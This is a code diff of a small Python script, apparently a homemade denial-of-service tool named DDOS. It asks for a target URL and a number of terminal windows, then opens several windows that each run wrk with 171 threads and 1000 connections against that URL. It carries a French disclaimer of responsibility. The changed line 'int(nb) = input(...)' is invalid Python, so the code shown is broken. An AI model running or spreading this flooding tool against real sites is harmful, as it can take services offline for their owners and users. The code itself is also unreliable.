@@ -4,12 +4,12 @@ import os
 
 def DDOS():
     print(f"Je ne suis pas responsable de ce que vous faites avec cette outils")
-    nb = input("Quelle est le nombre de terminal ouvert? ")
+    int(nb) = input("Quelle est le nombre de terminal ouvert? (seulement le chiffre svp)")
     URL = input("URL? (avec http.s): ")
     cmd = f"wrk -t171 -c1000 -d40 {URL}"
     systeme = platform.system()
 
-    for _ in range(nb_fenetres):
+    for _ in range(nb):
         if systeme == "Windows":
             subprocess.Popen([
                 "powershell", "-Command",
